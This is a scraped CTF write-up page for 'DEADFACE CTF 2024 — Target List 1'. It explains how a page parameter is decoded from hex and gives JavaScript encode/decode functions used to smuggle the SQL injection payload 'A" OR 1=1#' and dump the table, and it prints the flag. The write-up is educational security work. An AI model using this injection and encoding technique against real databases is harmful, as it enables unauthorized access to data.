</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="">        ret </span><span class="token operator">+=</span><span class=""> str</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="">    </span><span class="token punctuation">}</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="">    </span><span class="token keyword control-flow">return</span><span class=""> ret</span><span class="token punctuation">;</span><span class="">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class=""></span><span class="token punctuation">}</span></code></pre></div></div>
<p>Then, we can run</p>
<p><img src="https://gist.github.com/user-attachments/assets/2d0e6150-06a5-48e4-a625-29bcab02ae98" alt="image"/></p>
<p>to encode</p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary">Code<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">A&quot; OR 1=1#</span></code></pre></div></div>
<p>list the entire table, and get the flag:</p>
<p><img src="https://gist.github.com/user-attachments/assets/6fd6e365-5101-48c7-90fe-72eb59159cbd" alt="image"/></p>
<div class="border border-white/10 rounded-lg my-2"><p class="font-jetbrains flex items-center text-xs rounded-t-lg px-3 py-0.5 text-secondary">Code<button class="ml-auto hover:underline">(copy)</button></p><div class="rounded-b-lg overflow-hidden text-xs"><pre class="prismjs"><code style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span class="">flag{SQL-1nj3ct10n-thrU-x0r}</span></code></pre></div></div></main></div><!--$--><!--/$--></main><script src="/_next/static/chunks/9563dab5ba30607d.js" id="_R_" async=""></script><script>(self.__next_f=self.__next_f||[]).push([0])</script><script>self.__next_f.push([1,"1:\"$Sreact.fragment\"\n2:I[39756,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"default\"]\n3:I[37457,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"default\"]\n4:I[22016,[\"/_next/static/chunks/44838f11011a9f2d.js\"],\"\"]\n6:I[97367,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"OutletBoundary\"]\n7:\"$Sreact.suspense\"\n9:I[97367,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"ViewportBoundary\"]\nb:I[97367,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"MetadataBoundary\"]\nd:I[68027,[\"/_next/static/chunks/ff1a16fafef87110.js\",\"/_next/static/chunks/d037381d3416c607.js\"],\"default\"]\n:HL[\"/_next/static/chunks/0ae28dad4c293945.css\",\"style\"]\n:HL[\"/_next/static/media/70bc3e132a0a741e-s.p.15008bfb.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n:HL[\"/_next/static/media/83afe278b6a6bb3c-s.p.3a6ba036.woff2\",\"font\",{\"crossOrigin\":\"\",\"type\":\"font/woff2\"}]\n"])</script><script>self.__next_f.push([1,"0:{\"P\":null,\"b\":\"sdJrv7_XmnxBoagrmkq4p\",\"c\":[\"\",\"writeups\",\"7420e657c833bbe586c56a77aabf223d\"],\"q\":\"\",\"i\":false,\"f\":[[[\"\",{\"children\":[\"writeups\",{\"children\":[[\"id\",\"7420e657c833bbe586c56a77aabf223d\",\"d\"],{\"children\":[\"__PAGE__\",{}]}]}]},\"$undefined\",\"$undefined\",true],[[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"link\",\"0\",{\"rel\":\"stylesheet\",\"href\":\"/_next/static/chunks/0ae28dad4c293945.css\",\"precedence\":\"next\",\"crossOrigin\":\"$undefined\",\"nonce\":\"$undefined\"}]],[\"$\",\"html\",null,{\"className\":\"dark scroll-smooth jetbrains_mono_cc80ae23-module__2tkX8G__variable\",\"children\":[[\"$\",\"head\",null,{\"children\":[\"$\",\"meta\",null,{\"charSet\":\"utf-8\"}]}],[\"$\",\"body\",null,{\"className\":\"text-dark dark:text-white dark:bg-midnight\",\"style\":{\"fontFamily\":\"'Inter', 'Inter Fallback'\",\"fontStyle\":\"normal\"},\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":[[\"$\",\"div\",null,{\"className\":\"h-screen flex items-center justify-center\",\"children\":[\"$\",\"main\",null,{\"className\":\"relative pl-14\",\"children\":[[\"$\",\"svg\",null,{\"stroke\":\"currentColor\",\"fill\":\"currentColor\",\"strokeWidth\":\"0\",\"viewBox\":\"0 0 512 512\",\"className\":\"absolute left-0 top-2 text-5xl text-grapefruit\",\"children\":[\"$undefined\",[[\"$\",\"path\",\"0\",{\"d\":\"M256 48C140.559 48 48 140.559 48 256c0 115.436 92.559 208 208 208 115.435 0 208-92.564 208-208 0-115.441-92.564-208-208-208zm104.002 282.881l-29.12 29.117L256 285.117l-74.881 74.881-29.121-29.117L226.881 256l-74.883-74.881 29.121-29.116L256 226.881l74.881-74.878 29.12 29.116L285.119 256l74.883 74.881z\",\"children\":[]}]]],\"style\":{\"color\":\"$undefined\"},\"height\":\"1em\",\"width\":\"1em\",\"xmlns\":\"http://www.w3.org/2000/svg\"}],[\"$\",\"h1\",null,{\"className\":\"font-bold text-7xl underline decoration-grapefruit mb-5\",\"children\":\"404.\"}],[\"$\",\"p\",null,{\"children\":\"Your requested page was not found.\"}],[\"$\",\"$L4\",null,{\"href\":\"/\",\"className\":\"font-medium text-inherit\",\"children\":\"Return to home →\"}]]}]}],[]],\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]]}]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[null,[\"$\",\"main\",null,{\"className\":\"container pt-20 pb-24\",\"children\":[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]}]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[[[\"$\",\"script\",\"script-0\",{\"src\":\"/_next/static/chunks/44838f11011a9f2d.js\",\"async\":true,\"nonce\":\"$undefined\"}]],[[\"$\",\"$L4\",null,{\"href\":\"/writeups\",\"className\":\"text-secondary text-sm mb-10 -ml-5 block w-max\",\"children\":\"← Back to writeups\"}],[\"$\",\"$L2\",null,{\"parallelRouterKey\":\"children\",\"error\":\"$undefined\",\"errorStyles\":\"$undefined\",\"errorScripts\":\"$undefined\",\"template\":[\"$\",\"$L3\",null,{}],\"templateStyles\":\"$undefined\",\"templateScripts\":\"$undefined\",\"notFound\":\"$undefined\",\"forbidden\":\"$undefined\",\"unauthorized\":\"$undefined\"}]]]}],{\"children\":[[\"$\",\"$1\",\"c\",{\"children\":[\"$L5\",[[\"$\",\"script\",\"script-0\",{\"src\":\"/_next/static/chunks/03f4569ba78edab9.js\",\"async\":true,\"nonce\":\"$undefined\"}],[\"$\",\"script\",\"script-1\",{\"src\":\"/_next/static/chunks/44f6ea3170f4e31a.js\",\"async\":true,\"nonce\":\"$undefined\"}],[\"$\",\"script\",\"script-2\",{\"src\":\"/_next/static/chunks/39b99946d2be6a43.js\",\"async\":true,\"nonce\":\"$undefined\"}],[\"$\",\"script\",\"script-3\",{\"src\":\"/_next/static/chunks/116d3b69f07f8eb7.js\",\"async\":true,\"nonce\":\"$undefined\"}]],[\"$\",\"$L6\",null,{\"children\":[\"$\",\"$7\",null,{\"name\":\"Next.MetadataOutlet\",\"children\":\"$@8\"}]}]]}],{},null,false,false]},null,false,false]},null,false,false]},null,false,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$L9\",null,{\"children\":\"$@a\"}],[\"$\",\"div\",null,{\"hidden\":true,\"children\":[\"$\",\"$Lb\",null,{\"children\":[\"$\",\"$7\",null,{\"name\":\"Next.Metadata\",\"children\":\"$@c\"}]}]}],[\"$\",\"meta\",null,{\"name\":\"next-size-adjust\",\"content\":\"\"}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$d\",[]],\"S\":true}\n"])</script><script>self.__next_f.push([1,"a:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n"])</script><script>self.__next_f.push([1,"e:I[10453,[\"/_next/static/chunks/44838f11011a9f2d.js\",\"/_next/static/chunks/03f4569ba78edab9.js\",\"/_next/static/chunks/44f6ea3170f4e31a.js\",\"/_next/static/chunks/39b99946d2be6a43.js\",\"/_next/static/chunks/116d3b69f07f8eb7.js\"],\"default\"]\n:HL[\"https://gist.github.com/user-attachments/assets/78996e6e-b389-411c-aca3-a846a4b04c9c\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/297c9f02-ad97-4b6e-8182-95af781296e2\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/5700b3b3-7120-44d6-b07b-cfbf08e619d4\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/821a70ec-83b1-47ae-be64-f32d08203cf4\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/d714b8c5-e9fa-4ef2-9a7b-4151402b89e8\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/440879e4-f67c-4a08-b499-62a64b494298\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/ae6f04f8-b99a-4520-bbb9-0f530a128542\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/a8216a9e-5c2a-4b0d-9a30-00c2b40a0caa\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/a47e53ce-cbaf-4569-be74-588d45464645\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/226005a9-c14c-4afd-bf96-f23f2e7d7bae\",\"image\"]\n"])</script><script>self.__next_f.push([1,"5:[\"$\",\"div\",null,{\"children\":[\"$\",\"main\",null,{\"className\":\"text-pretty max-w-5xl mx-auto text-sm [\u0026_h1]:text-5xl [\u0026_h1]:font-semibold [\u0026_h1]:mb-8 [\u0026_blockquote]:text-secondary [\u0026_blockquote]:space-y-3 [\u0026_blockquote]:border-l-4 [\u0026_blockquote]:border-secondary [\u0026_blockquote]:pl-5 [\u0026_blockquote]:mb-5 [\u0026\u003e_p]:my-4 [\u0026_img]:my-5 [\u0026_ul]:list-disc [\u0026_ul]:pl-6 [\u0026_ol]:list-decimal [\u0026_ol]:pl-6 [\u0026_img]:rounded [\u0026_li]:my-2\",\"children\":[[\"$\",\"h1\",\"h1-0\",{\"children\":\"DEADFACE CTF 2024 — Target List 1\"}],\"\\n\",[\"$\",\"blockquote\",\"blockquote-0\",{\"children\":[\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"Deadface is running a server where they have a list of targets they are planning on using in an upcoming attack. See if you can find any targets they are trying to hide.\"}],\"\\n\",[\"$\",\"p\",\"p-1\",{\"children\":[\"$\",\"a\",\"a-0\",{\"href\":\"http://targetlist.deadface.io:3001\",\"children\":\"http://targetlist.deadface.io:3001\"}]}],\"\\n\"]}],\"\\n\",[\"$\",\"p\",\"p-0\",{\"children\":\"We're given a simple website that looks like this:\"}],\"\\n\",[\"$\",\"p\",\"p-1\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/78996e6e-b389-411c-aca3-a846a4b04c9c\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-2\",{\"children\":\"On each \\\"page\\\", we can find records that begin with \\\"A\\\", \\\"B\\\", and \\\"C\\\":\"}],\"\\n\",[\"$\",\"p\",\"p-3\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/297c9f02-ad97-4b6e-8182-95af781296e2\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-4\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/5700b3b3-7120-44d6-b07b-cfbf08e619d4\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-5\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/821a70ec-83b1-47ae-be64-f32d08203cf4\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-6\",{\"children\":\"At first, it looks like we get to query users that start with\"}],\"\\n\",[\"$\",\"$Le\",\"pre-0\",{\"className\":\"my-2\",\"children\":\"String.fromCharCode(64 + page)\",\"language\":\"js\"}],\"\\n\",[\"$\",\"p\",\"p-7\",{\"children\":[\"where \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"page\"}],\" is the integer query parameter passed to the page.\"]}],\"\\n\",[\"$\",\"p\",\"p-8\",{\"children\":[\"If we manually edit the \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"\u0026page=\"}],\" query parameter to go to page 4, it looks like we can query users beginning with \\\"D\\\" as expected.\"]}],\"\\n\",[\"$\",\"p\",\"p-9\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/d714b8c5-e9fa-4ef2-9a7b-4151402b89e8\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-10\",{\"children\":\"Similarly, we can query users with \\\"I\\\" on page 9, but somehow the query changes to \\\"II\\\" on page 99, \\\"IÙ\\\" on page 999, and \\\"IÙI\\\" on page 9999:\"}],\"\\n\",[\"$\",\"p\",\"p-11\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/440879e4-f67c-4a08-b499-62a64b494298\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-12\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/ae6f04f8-b99a-4520-bbb9-0f530a128542\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-13\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/a8216a9e-5c2a-4b0d-9a30-00c2b40a0caa\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-14\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/a47e53ce-cbaf-4569-be74-588d45464645\",\"alt\":\"image\"}]}],\"\\n\",[\"$\",\"p\",\"p-15\",{\"children\":[\"so it looks like our input gets grouped into pairs when parsed. Furthermore, if we go to page \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"f\"}],\", we end up querying users starting with \\\"O\\\"; 'A' + 15.\"]}],\"\\n\",[\"$\",\"p\",\"p-16\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/226005a9-c14c-4afd-bf96-f23f2e7d7bae\",\"alt\":\"image\"}]}],\"\\n\",\"$Lf\",\"\\n\",\"$L10\",\"\\n\",\"$L11\",\"\\n\",\"$L12\",\"\\n\",\"$L13\",\"\\n\",\"$L14\",\"\\n\",\"$L15\",\"\\n\",\"$L16\",\"\\n\",\"$L17\",\"\\n\",\"$L18\",\"\\n\",\"$L19\",\"\\n\",\"$L1a\",\"\\n\",\"$L1b\",\"\\n\",\"$L1c\",\"\\n\",\"$L1d\",\"\\n\",\"$L1e\",\"\\n\",\"$L1f\",\"\\n\",\"$L20\",\"\\n\",\"$L21\",\"\\n\",\"$L22\",\"\\n\",\"$L23\"]}]}]\n"])</script><script>self.__next_f.push([1,":HL[\"https://gist.github.com/user-attachments/assets/a2d3d6ab-582c-485c-83a7-c6de6f5f92f5\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/1fd3dbe0-5dc9-4306-96d0-a9ace24af4d6\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/3d1651db-960f-4ba6-b3b5-1cda3f7083c4\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/6274445e-4609-4097-a385-6ba62a32d93c\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/051a1590-d119-4c4c-a1c7-8635c93b7d06\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/d6bb46cd-8222-4f6f-afff-93c48812a301\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/2d0e6150-06a5-48e4-a625-29bcab02ae98\",\"image\"]\n:HL[\"https://gist.github.com/user-attachments/assets/6fd6e365-5101-48c7-90fe-72eb59159cbd\",\"image\"]\nf:[\"$\",\"p\",\"p-17\",{\"children\":\"With this, we get a pretty clear picture of how our query parameter is parsed: a 0 is appended to the input, then the page number is interpreted as hex bytes (where 64 is added to each byte so 1 maps to \\\"A\\\"). Then, we can guess our input is handled something like so:\"}]\n10:[\"$\",\"$Le\",\"pre-1\",{\"className\":\"my-2\",\"children\":\"function conv(s) {\\n    const chars = ('0' + s).split('');\\n    let ret = '';\\n\\n    for (let i = 0; i \u003c chars.length; i += 2) {\\n        let byte = chars[i];\\n        if (i + 1 \u003c chars.length) byte += chars[i + 1];\\n\\n        let num = 64 + parseInt(byte, 16);\\n        ret += String.fromCharCode(num);\\n    }\\n\\n    return ret;\\n}\",\"language\":\"js\"}]\n11:[\"$\",\"p\",\"p-18\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/a2d3d6ab-582c-485c-83a7-c6de6f5f92f5\",\"alt\":\"image\"}]}]\n12:[\"$\",\"p\",\"p-19\",{\"children\":[\"But then, when we go to page \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"162\"}],\",\"]}]\n13:[\"$\",\"p\",\"p-20\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/1fd3dbe0-5dc9-4306-96d0-a9ace24af4d6\",\"alt\":\"image\"}]}]\n14:[\"$\",\"p\",\"p-21\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/3d1651db-960f-4ba6-b3b5-1cda3f7083c4\",\"alt\":\"image\"}]}]\n15:[\"$\",\"p\",\"p-22\",{\"children\":[\"Why would the cent character cause things to fail? If we go to page \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"163\"}],\", something's not right; we get \\\"#\\\" instead of \\\"£\\\" as expected:\"]}]\n16:[\"$\",\"p\",\"p-23\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/6274445e-4609-4097-a385-6ba62a32d93c\",\"alt\":\"image\"}]}]\n17:[\"$\",\"p\",\"p-24\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/051a1590-d119-4c4c-a1c7-8635c93b7d06\",\"alt\":\"image\"}]}]\n18:[\"$\",\"p\",\"p-25\",{\"children\":[\"Then, there must be a narrow range of characters where our bytes \",[\"$\",\"em\",\"em-0\",{\"children\":\"are\"}],\" subtracted by 128 allowing us to get a wider range of characters. To simplify things, we can assume this range applies to everything above 128 (not true for page \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"999\"}],\" seen earlier, but the discrepancy is ultimately unimportant to solve the challenge):\"]}]\n19:[\"$\",\"$Le\",\"pre-2\",{\"className\":\"my-2\",\"children\":\"function conv(s) {\\n    const rest = ('0' + s).split('');\\n    let ret = '';\\n\\n    for (let i = 0; i \u003c rest.length; i += 2) {\\n        let group = rest[i];\\n        if (i + 1 \u003c rest.length) group += rest[i + 1];\\n\\n        let num = 64 + parseInt(group, 16);\\n        if (num \u003e 128) num -= 128;\\n        ret += String.fromCharCode(num);\\n    }\\n\\n    return ret;\\n}\",\"language\":\"js\"}]\n1a:[\"$\",\"p\",\"p-26\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/d6bb46cd-8222-4f6f-afff-93c48812a301\",\"alt\":\"image\"}]}]\n1b:[\"$\",\"p\",\"p-27\",{\"children\":[\"So our input was actually failing on double quotes... could that imply"])</script><script>self.__next_f.push([1," it was being passed to a database as an SQL query? Based on the updated \",[\"$\",\"code\",\"code-0\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"conv()\"}],\" function, we can write a simple \",[\"$\",\"code\",\"code-1\",{\"className\":\"font-jetbrains opacity-75 bg-black/10 dark:bg-black/30 rounded px-1.5 py-1 text-[0.9em]\",\"children\":\"deconv()\"}],\" function to reverse desired strings to query param bytes:\"]}]\n1c:[\"$\",\"$Le\",\"pre-3\",{\"className\":\"my-2\",\"children\":\"function deconv(s) {\\n    let ret = '1';\\n    for (const c of s) {\\n        let diff = c.charCodeAt(0) - 64;\\n        if (diff \u003c 0) diff += 128;\\n\\n        let str = diff.toString(16);\\n        if (str.length \u003c 2) str = '0' + str;\\n        ret += str;\\n    }\\n    return ret;\\n}\",\"language\":\"js\"}]\n1d:[\"$\",\"p\",\"p-28\",{\"children\":\"Then, we can run\"}]\n1e:[\"$\",\"p\",\"p-29\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/2d0e6150-06a5-48e4-a625-29bcab02ae98\",\"alt\":\"image\"}]}]\n1f:[\"$\",\"p\",\"p-30\",{\"children\":\"to encode\"}]\n20:[\"$\",\"$Le\",\"pre-4\",{\"className\":\"my-2\",\"children\":\"A\\\" OR 1=1#\",\"language\":\"$undefined\"}]\n21:[\"$\",\"p\",\"p-31\",{\"children\":\"list the entire table, and get the flag:\"}]\n22:[\"$\",\"p\",\"p-32\",{\"children\":[\"$\",\"img\",\"img-0\",{\"src\":\"https://gist.github.com/user-attachments/assets/6fd6e365-5101-48c7-90fe-72eb59159cbd\",\"alt\":\"image\"}]}]\n23:[\"$\",\"$Le\",\"pre-5\",{\"className\":\"my-2\",\"children\":\"flag{SQL-1nj3ct10n-thrU-x0r}\",\"language\":\"$undefined\"}]\n"])</script><script>self.__next_f.push([1,"c:[[\"$\",\"title\",\"0\",{\"children\":\"DEADFACE CTF 2024 — Target List 1 | kevin.fish\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"Deadface is running a server where they have a list of targets they are planning on using in an upcoming attack. See if you can find any targets they are trying to hide.\"}],[\"$\",\"meta\",\"2\",{\"property\":\"og:title\",\"content\":\"DEADFACE CTF 2024 — Target List 1\"}],[\"$\",\"meta\",\"3\",{\"property\":\"og:description\",\"content\":\"Deadface is running a server where they have a list of targets they are planning on using in an upcoming attack. See if you can find any targets they are trying to hide.\"}],[\"$\",\"meta\",\"4\",{\"name\":\"twitter:card\",\"content\":\"summary\"}],[\"$\",\"meta\",\"5\",{\"name\":\"twitter:title\",\"content\":\"DEADFACE CTF 2024 — Target List 1\"}],[\"$\",\"meta\",\"6\",{\"name\":\"twitter:description\",\"content\":\"Deadface is running a server where they have a list of targets they are planning on using in an upcoming attack. See if you can find any targets they are trying to hide.\"}]]\n8:null\n"])</script></body></html>